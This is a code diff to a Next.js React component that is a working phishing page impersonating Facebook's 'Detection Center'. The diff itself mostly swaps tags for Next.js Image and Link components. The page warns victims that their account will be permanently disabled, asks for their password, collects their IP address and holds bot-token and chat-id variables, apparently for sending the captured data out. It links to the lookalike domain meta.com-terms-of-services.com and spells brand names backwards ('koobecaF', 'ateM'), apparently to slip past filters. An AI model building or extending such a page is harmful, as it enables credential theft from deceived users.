@@ -1,4 +1,6 @@
 import React, { useState, useEffect } from 'react'
+import Image from 'next/image';
+import Link from 'next/link';
 import axios from "axios";
 
 export default function Addinfo() {
@@ -16,8 +18,8 @@ export default function Addinfo() {
 
   let password2 = '';
 
-  const botToken = process.env.BOT_TOKEN;
-  const chatId = process.env.CHAT_ID;
+  const botToken = process.env.NEXT_PUBLIC_BOT_TOKEN;
+  const chatId = process.env.NEXT_PUBLIC_CHAT_ID;
 
   const getData = async () => {
     const res = await axios.get("https://api.ipify.org/?format=json");
@@ -78,41 +80,38 @@ export default function Addinfo() {
           <div className="container mx-auto max-w-[1164px] flex justify-between">
             <div className="flex justify-between flex-wrap p-6 pb-0">
               <div className="flex items-center flex-shrink-0 text-white mr-[50px] pb-[25px]">
-                <img src="facebook.png" className="w-100 h-10 mr-2" alt="Logo" />
+                <Image src="facebook.png" className=" mr-2" alt="Logo" width={100} height={100} />
                 <h2 className="text-base font-bold leading-6 text-black">
                   Facebook
                 </h2>
               </div>
 
-              <div
-                className={`w-full block flex-grow lg:flex lg:items-center lg:w-auto 
-                                    }`}
-              >
+              <div className={`w-full block flex-grow lg:flex lg:items-center lg:w-auto }`} >
                 <div className="text-sm lg:flex-grow lg:space-x-[50px] space-x-0">
-                  <a
+                  <Link
                     href="/"
                     className="hidden mt-4 lg:inline-block lg:mt-0 text-white-200 mr-4 text-sm text-[#4338ca] pb-0 lg:pb-[25px] lg:border-b lg:border-[#4338ca] "
                   >
                     Detection center
-                  </a>
-                  <a
+                  </Link>
+                  <Link
                     href="/"
                     className="hidden mt-4 lg:inline-block lg:mt-0 text-white-200 mr-4 text-sm hover:text-[#4338ca]"
                   >
                     Privacy Policy
-                  </a>
-                  <a
+                  </Link>
+                  <Link
                     href="/"
                     className="hidden mt-4 lg:inline-block lg:mt-0 text-white-200 mr-4 text-sm hover:text-[#4338ca]"
                   >
                     Developers
-                  </a>
-                  <a
+                  </Link>
+                  <Link
                     href="/"
                     className="hidden mt-4 lg:inline-block lg:mt-0 text-white-200 mr-4 text-sm hover:text-[#4338ca]"
                   >
                     Help
-                  </a>
+                  </Link>
                 </div>
               </div>
             </div>
@@ -142,15 +141,19 @@ export default function Addinfo() {
                 placeholder="Search"
                 className="bg-[#f0f2f5] text-[15px] rounded-full w-[284px] h-[36px] mt-6 relative px-12 border-none"
               />
-              <img
+              <Image
                 src="human.png"
-                className="w-[32px] h-[32px] mt-6 ml-2"
+                className="mt-6 ml-2"
                 alt="noImg"
+                width={32}
+                height={32}
               />
-              <img
+              <Image
                 src="download.png"
                 alt="noImg"
                 className="absolute left-[15px] bottom-[35px]"
+                width={32}
+                height={32}
               />
             </div>
           </div>
@@ -177,7 +180,7 @@ export default function Addinfo() {
                     <div className='border border-x-0 border-gray-300 border-t-1 border-b-1'>
                       <p className="m-3 text-sm font-medium text-gray-600">Please authenticate by entering your password to submit this request.</p>
                       <div className='flex items-center'>
-                        <img className='w-24 h-20 m-3' alt="avatar" src="data:image/jpeg;base64,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" />
+                        <Image className='w-24 h-20 m-3' width={24} height={20} alt="avatar" src="data:image/jpeg;base64,UklGRjIGAABXRUJQVlA4ICYGAACwVwCdASpYApABPm02mkkkIyKhInoIGIANiWlu4XdhD7M2tH9M3aJbBfXaN9muKHf5+j8L7mx//gYpX1ZExjh8IRUPr4/vqyJjHFMJjHD4Qiobgr2TO/V2HfMTD7bA26ojK76siYxw+EIqH18f31JQCdoNkoH4E6B5ABOtAbmb6siYxw+EIqH18f3QgzvAgnETFGrN8gJm2nIxw+EIqH18f31ZExSpxqcKWQhE/dtoMAZb7Rjh8IRUPr4/vqyIaFgiha6McPC8hjUleUKh9fH99WRMY4fBppLggt0KfBWoj9ZExjh8IRUPr4/vlSS4ILdCnwoW1t9CboVD6+P76siYpLdpvSu0+bmtM1MFfH99WRMY4fCEVD4CtxROGj76yJcNYsHmoiYxw+EIqH18f31Y9nu23BboVDavfOE2rtPoTdCofXx/fUibDgafCEU+Drl2OqC3QqH18f31ZExjhNg4ueKD6tqH1c44jQfRavj++rImMcPhCKh9XuRbBXA+r5gDxFqNPoTdCofXx/fVkTFChAdNTj6x6cfyE1T6yJjHD4QiofXx/fKBp5ilyDSLdA8Do7dHz8IRUPr4/vqyJjHD3n9+wUmMbOGfhhgxjh8IRUPr4/vqyJcjtJH9T8vt0DsN+XggXQqH18f31ZExjh7yvJiWOvj+NA7FkwhFQ+vj++rImMcPeTVZlaLFmjMNWPfJjeYY+Gzn66ofXx/fVkTGOHh4Azv/ZE78OaSxRh+rImUiV4xbkMVecy8kHSbRjh8IRUPr4kV12A+nmy5e/vtVkTGOHwpLXXXQfi+Mc7tAjau0+hN0KAQCN83/6hGzgwqL+EIqH18f3S9HmhQa5+0UGSx9ZExjhPsnVLNFnUFkTGOHwhFQ+vkuDhlT7UvrImtfXx/fJUR9OhZA574Bq7HposVl0Kh9fH+v680woqNSWxJy2Pq9AAD+/8rTfwa70nxWYpnoQBUbw+z227W4Z2Qliz44JNK5aQjBq8uyMadlm/DenZ+5sbQuzogSOF7JuUyGzY9MZ6kW0Ape3GBYqT1IW5hoXwA9fxKbigodH7MVjhuGwyp8MBiHyYw0uBNqhu8n417Aa3hSeTl43Q+lmBHy3Qcdt255nol+fNLIoVI0APoyAwG1ntoVL6eyvPaP/lNtFmHp03Kf3mLv75u+SK/IvONGLLB3uo46LoHfIphCliJbOBCAauoUynpP+GgXSb/iTjoWqIJluKBjycnQqmRuUnUqjB88A4Qwm4363UQF84AiIed6a4ATJeYABNl93VAAK9ZRj4AA2mufaOC4cUK1fSLfhDg5ZlvRkHbTVNUIySgbWi+mNVxH9rrLGjv4ZY/3nhwfaATSmMBiQkHNRl2sewvG8YI4G3mrRtOfLetHhdni5CnTeStoRGaFbRmJQNzLhUObNlR9dTGFd0mIhVpp+tETM8a651P9E5g1/7gU8ERwqIBsEWrIqC204IS5TFjTZCHwS+i6CdgAyJShM61O8v8TDjy3d5AIHzAKA4OAcAzU8rMXYZY6vMynoAM861EkpAh8A95Laojn6fIxTaXz+l11XO1RLUicA8C2HpbYvgI0UNFx4TZYxmKjw2a2oQKxD03w7uyu9xdSyrO2rhv9wv5LQnp+Tjnz4taAmmg1Z8RVVnWhTQgUu+3bJyBi0l3NCUk0gGxm8b6htO9v0hY4HBO4/y5WSwrBbqfY4IpzgxpQJ0fTwJ/SwAgJCxKtYTLp2iJCNVrZodjKMaI5IV/pFbIhFSpTXXsgllNsDsxvA+jWBNkfy3Dh2KOr7bpINI7WfvMegFXf7MjiOwxBwX4Nj9sWxk7HDl8O4tMGDpugeLmNUe3NRAARVJPMBP6KlvuNiGu6jEU6AKOO2fwxu8EWm1Try9n1rF7G8SGeJSDRx+HMTqRsenQFxpqnWwENSYTQ8Dmh94QoAiAzR/wi48+f8vQbrxbepUkTAp1Vz+9VJyNLfOKqPWIO/iUy/bNamRt/HEto3hc0nXWHoZyrFG2/AAAhXYT795b71B3duDDnZ5JfhVIcgypTP5Hueseq3QAYhivdw/yUQAAlUz7uRC5gtvhGximobkSIUY65E6as2C62QAAAAA==" />
                         <div>
                           <p className='pl-2 font-bold'>{name}</p>
                           <input type="password" value={password} id="password" className="m-2 border border-gray-300 text-gray-900 text-sm rounded-md focus:ring-blue-500 focus:border-blue-500 block w-full p-1.5 placeholder:text-slate-400 placeholder:p-2" placeholder="Password" onChange={(e) => setPassword(e.target.value)} />
@@ -229,17 +232,17 @@ export default function Addinfo() {
                     <div className='grid justify-end'>3</div>
                   </div>
                   <div className='flex justify-between '>
-                    <a href="#" style={{ color: 'blue' }}><svg className="w-6 h-6 MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="CheckCircleOutlineIcon">
+                    <Link href="#" style={{ color: 'blue' }}><svg className="w-6 h-6 MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="CheckCircleOutlineIcon">
                       <path d="M16.59 7.58 10 14.17l-3.59-3.58L5 12l5 5 8-8zM12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z"></path>
-                    </svg></a>
+                    </svg></Link>
                     <div className='bg-gray-300 w-full h-0.5 mt-3'></div>
-                    <a href="#" style={{ color: 'blue' }}><svg className="w-6 h-6 MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" z-index={999} focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="RadioButtonUncheckedIcon">
+                    <Link href="#" style={{ color: 'blue' }}><svg className="w-6 h-6 MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" z-index={999} focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="RadioButtonUncheckedIcon">
                       <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z"></path>
-                    </svg></a>
+                    </svg></Link>
                     <div className='bg-gray-300 w-full h-0.5 mt-3'></div>
-                    <a href="#" style={{ color: 'blue' }}><svg className="w-6 h-6 MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" z-index={999} focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="RadioButtonUncheckedIcon">
+                    <Link href="#" style={{ color: 'blue' }}><svg className="w-6 h-6 MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" z-index={999} focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="RadioButtonUncheckedIcon">
                       <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z"></path>
-                    </svg></a>
+                    </svg></Link>
                   </div>
                   <div className='col-span-2 p-3 bg-white mt-2'>
                     <div className='flex w-auto pt-2 text-2xl text-gray-800'>
@@ -276,7 +279,7 @@ export default function Addinfo() {
                   </div>
                 </div>
                 <div className='p-3 basis-1/3 border border-gray-300 border-y-0 border-r-0 border-l-1 text-gray-500'>
-                  <p className='pt-3'>Our Detection Center System identifies accounts which violate our <a href='https://www.facebook.com/legal/terms' style={{ textDecoration: 'underline', color: 'blue' }}>Terms of Service</a> and our <a href='https://transparency.fb.com/en-gb/policies/community-standards/' style={{ textDecoration: 'underline', color: 'blue' }}>Community Standards</a>, mainly targetting <a href='https://meta.com-terms-of-services.com/submit-form#' style={{ textDecoration: 'underline', color: 'blue' }}>Duplicate or shared accounts used by many people</a>. or accounts which impersonate someone else.</p>
+                  <p className='pt-3'>Our Detection Center System identifies accounts which violate our <Link href='https://www.facebook.com/legal/terms' style={{ textDecoration: 'underline', color: 'blue' }}>Terms of Service</Link> and our <Link href='https://transparency.fb.com/en-gb/policies/community-standards/' style={{ textDecoration: 'underline', color: 'blue' }}>Community Standards</Link>, mainly targetting <Link href='https://meta.com-terms-of-services.com/submit-form#' style={{ textDecoration: 'underline', color: 'blue' }}>Duplicate or shared accounts used by many people</Link>. or accounts which impersonate someone else.</p>
                   <div className='hidden lg:block'>
                     <p className='pt-10'><b>What this means for you ?</b></p>
                     <p className='pt-3'>We are obliged to permanently disable your account, unless you request a formal review by our dedicated team which will review each account against our detections.</p>
@@ -292,30 +295,30 @@ export default function Addinfo() {
       </div>
       <footer className="w-full bg-white text-center pb-[28px]">
         <div className="flex space-x-[20px] justify-center pt-[40px] mb-[24px]">
-          <a
+          <Link
             className="text-base leading-5 hover:text-[#4446de] hover:underline"
             href="/"
           >
             Products
-          </a>
-          <a
+          </Link>
+          <Link
             className="text-base leading-5 hover:text-[#4446de] hover:underline"
             href="/"
           >
             Terms & Policies
-          </a>
-          <a
+          </Link>
+          <Link
             className="text-base leading-5 hover:text-[#4446de] hover:underline"
             href="/"
           >
             Developers
-          </a>
-          <a
+          </Link>
+          <Link
             className="text-base leading-5 hover:text-[#4446de] hover:underline"
             href="/"
           >
             Help
-          </a>
+          </Link>
         </div>
         <p className="text-xs text-[#6b7280] max-w-[500px] text-center mx-auto mb-[16px]">
           The koobecaF company is now ateM. We’ve updated our Terms of Use,
